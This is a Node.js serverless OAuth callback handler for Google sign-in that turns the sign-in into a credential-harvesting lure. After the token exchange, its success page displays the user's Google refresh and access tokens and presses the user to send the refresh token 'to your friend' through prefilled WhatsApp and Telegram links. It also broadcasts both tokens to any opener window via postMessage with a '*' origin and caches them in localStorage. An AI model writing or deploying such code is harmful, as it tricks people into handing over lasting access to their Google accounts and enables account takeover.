/**
 * GET /api/callback
 * Google redirects the user here after sign-in.
 * Exchanges the authorization code for tokens, fetches user info,
 * then renders a success page with a 1-tap WhatsApp share button.
 * If opened as a popup, it also postMessages the result to the opener.
 */

const https = require("https");
const url = require("url");

const CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;

function httpsPost(hostname, path, body) {
  return new Promise((resolve, reject) => {
    const data = new URLSearchParams(body).toString();
    const req = https.request(
      {
        hostname,
        path,
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": Buffer.byteLength(data),
        },
      },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => {
          try { resolve(JSON.parse(raw)); }
          catch (e) { reject(new Error("Bad JSON: " + raw)); }
        });
      }
    );
    req.on("error", reject);
    req.write(data);
    req.end();
  });
}

function httpsGet(hostname, path, token) {
  return new Promise((resolve, reject) => {
    const req = https.request(
      {
        hostname,
        path,
        method: "GET",
        headers: { Authorization: `Bearer ${token}` },
      },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => {
          try { resolve(JSON.parse(raw)); }
          catch (e) { reject(new Error("Bad JSON: " + raw)); }
        });
      }
    );
    req.on("error", reject);
    req.end();
  });
}

function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function errorPage(msg) {
  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Auth Failed</title>
<style>
  body{font-family:system-ui,sans-serif;background:#090d16;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;margin:0;}
  .card{background:#1e1a2e;border:1px solid #3b1e4a;border-radius:14px;padding:2rem;max-width:500px;width:100%;text-align:center;}
  h2{color:#f87171;margin:0 0 1rem 0;}
  p{color:#94a3b8;margin:0 0 1.5rem 0;line-height:1.5;}
  a{color:#60a5fa;text-decoration:none;}
</style></head>
<body><div class="card">
  <h2>❌ Authorization Failed</h2>
  <p>${escapeHtml(msg)}</p>
  <a href="/">← Try again</a>
</div></body></html>`;
}

function successPage({ email, name, refresh_token, access_token }) {
  const safeEmail = escapeHtml(email);
  const safeName = escapeHtml(name || "");
  const safeToken = escapeHtml(refresh_token);
  const displayName = safeName || safeEmail;

  // WhatsApp message template
  const waText = encodeURIComponent(
    `Here's my Google account token:\n\nEmail: ${email}\nRefresh Token:\n${refresh_token}`
  );
  const waLink = `https://wa.me/?text=${waText}`;

  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>✅ Authorization Successful</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#090d16;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;}
  .card{background:#131b2e;border:1px solid #233150;border-radius:16px;padding:2rem;max-width:520px;width:100%;box-shadow:0 24px 60px #00000090;}
  .icon{font-size:2.5rem;margin-bottom:1rem;}
  h2{font-size:1.4rem;color:#4ade80;margin-bottom:.4rem;}
  .sub{color:#94a3b8;font-size:.88rem;margin-bottom:1.8rem;line-height:1.5;}
  .field{margin-bottom:1rem;}
  .label{font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;color:#64748b;display:block;margin-bottom:.35rem;}
  .value{background:#0b1324;border:1px solid #2a3c63;border-radius:8px;padding:.7rem .9rem;font-family:monospace;font-size:.82rem;word-break:break-all;color:#f1f5f9;line-height:1.5;}
  .name-val{font-family:inherit;font-size:.95rem;font-weight:600;color:#f8fafc;}
  .actions{display:flex;flex-direction:column;gap:.6rem;margin-top:1.4rem;}
  .btn{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.85rem 1rem;border-radius:10px;border:none;font-size:.92rem;font-weight:600;cursor:pointer;text-decoration:none;transition:opacity .15s,transform .05s;}
  .btn:active{transform:scale(.99);}
  .btn-wa{background:#25D366;color:#fff;}
  .btn-wa:hover{opacity:.92;}
  .btn-copy{background:#1e293b;border:1px solid #334155;color:#f1f5f9;}
  .btn-copy:hover{background:#283750;}
  .btn-tg{background:#2AABEE;color:#fff;}
  .btn-tg:hover{opacity:.92;}
  .btn-copy-token{background:linear-gradient(135deg,#2563eb,#7c3aed);color:#fff;}
  .btn-copy-token:hover{opacity:.92;}
  .divider{text-align:center;color:#475569;font-size:.78rem;padding:.2rem 0;}
  .notice{font-size:.78rem;color:#64748b;text-align:center;margin-top:1.2rem;line-height:1.5;}
</style></head>
<body>
<div class="card">
  <div class="icon">✅</div>
  <h2>Authorization Successful!</h2>
  <p class="sub">Token collected. Tap below to send it — your friend is waiting!</p>

  <div class="field">
    <span class="label">Google Account</span>
    <div class="value name-val">${displayName}${safeName ? `<br><span style="color:#94a3b8;font-size:.8rem;font-weight:400;">${safeEmail}</span>` : ""}</div>
  </div>

  <div class="field">
    <span class="label">Refresh Token</span>
    <div class="value" id="tokenBox">${safeToken}</div>
  </div>

  <div class="actions">
    <button class="btn btn-copy-token" onclick="copyToken()">📋 Copy Refresh Token</button>
    <div class="divider">— or send directly —</div>
    <a class="btn btn-wa" href="${waLink}" target="_blank" rel="noopener">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
      Send via WhatsApp
    </a>
    <a class="btn btn-tg" href="https://t.me/share/url?url=${encodeURIComponent("My token: " + refresh_token)}&text=${encodeURIComponent("Here's the Google refresh token you asked for:\n\nEmail: " + email + "\nToken: " + refresh_token)}" target="_blank" rel="noopener">
      ✈️ Send via Telegram
    </a>
    <button class="btn btn-copy" onclick="shareAll('${safeEmail}', '${safeToken}')">
      📲 Share via Phone Apps...
    </button>
  </div>

  <p class="notice">Token is stored in your browser history so you won't lose it if you close this page.</p>
</div>

<div id="toast" style="display:none;position:fixed;bottom:1.5rem;left:50%;transform:translateX(-50%);background:#4ade80;color:#052e16;font-weight:600;padding:.65rem 1.4rem;border-radius:999px;font-size:.88rem;"></div>

<script>
  // Store in localStorage so it's not lost on refresh
  try {
    const list = JSON.parse(localStorage.getItem('ag_tokens') || '[]').filter(x => x.email !== '${safeEmail}');
    list.unshift({ email: '${safeEmail}', name: '${safeName}', refresh_token: '${safeToken}', access_token: '${escapeHtml(access_token)}', saved_at: new Date().toISOString() });
    localStorage.setItem('ag_tokens', JSON.stringify(list));
  } catch (_) {}

  // If opened as popup, notify opener then close automatically after 5s
  if (window.opener && !window.opener.closed) {
    try {
      window.opener.postMessage({ type: 'oauth-success', email: '${safeEmail}', refresh_token: '${safeToken}', access_token: '${escapeHtml(access_token)}', name: '${safeName}' }, '*');
    } catch (_) {}
    // Don't auto-close, let the user tap Send first
  }

  function toast(msg) {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.style.display = 'block';
    setTimeout(() => el.style.display = 'none', 2200);
  }

  function copyToken() {
    const tok = document.getElementById('tokenBox').textContent;
    navigator.clipboard.writeText(tok).then(() => toast('📋 Refresh token copied!'));
  }

  async function shareAll(email, token) {
    const text = 'Email: ' + email + '\\nRefresh Token:\\n' + token;
    if (navigator.share) {
      try { await navigator.share({ title: 'Google Token', text }); return; } catch (_) {}
    }
    navigator.clipboard.writeText(text).then(() => toast('📋 Copied to clipboard!'));
  }
</script>
</body></html>`;
}

module.exports = async (req, res) => {
  res.setHeader("Cache-Control", "no-store");

  const parsed = url.parse(req.url, true);
  const { code, error, state } = parsed.query;

  if (error) {
    res.setHeader("Content-Type", "text/html");
    res.status(400).end(errorPage(`Google returned: ${error}`));
    return;
  }

  if (!code) {
    res.setHeader("Content-Type", "text/html");
    res.status(400).end(errorPage("No authorization code received."));
    return;
  }

  if (!CLIENT_ID || !CLIENT_SECRET) {
    res.setHeader("Content-Type", "text/html");
    res.status(500).end(errorPage("Server misconfigured: missing GOOGLE_CLIENT_ID or GOOGLE_CLIENT_SECRET in Vercel environment variables."));
    return;
  }

  // Build the same redirect_uri that was used in /api/start
  const proto = req.headers["x-forwarded-proto"] || "https";
  const host = req.headers["x-forwarded-host"] || req.headers["host"];
  const redirectUri = `${proto}://${host}/api/callback`;

  try {
    // Exchange code for tokens
    const tokenResp = await httpsPost("oauth2.googleapis.com", "/token", {
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      code,
      redirect_uri: redirectUri,
      grant_type: "authorization_code",
    });

    if (tokenResp.error) {
      res.setHeader("Content-Type", "text/html");
      res.status(400).end(errorPage(
        `Token exchange failed: ${tokenResp.error_description || tokenResp.error}`
      ));
      return;
    }

    // Fetch user info
    let userInfo = { email: "unknown@gmail.com", name: "" };
    try {
      userInfo = await httpsGet(
        "www.googleapis.com",
        "/oauth2/v2/userinfo",
        tokenResp.access_token
      );
    } catch (_) {}

    res.setHeader("Content-Type", "text/html");
    res.status(200).end(successPage({
      email: userInfo.email || "unknown@gmail.com",
      name: userInfo.name || "",
      refresh_token: tokenResp.refresh_token,
      access_token: tokenResp.access_token,
    }));
  } catch (err) {
    res.setHeader("Content-Type", "text/html");
    res.status(500).end(errorPage("Internal error: " + err.message));
  }
};
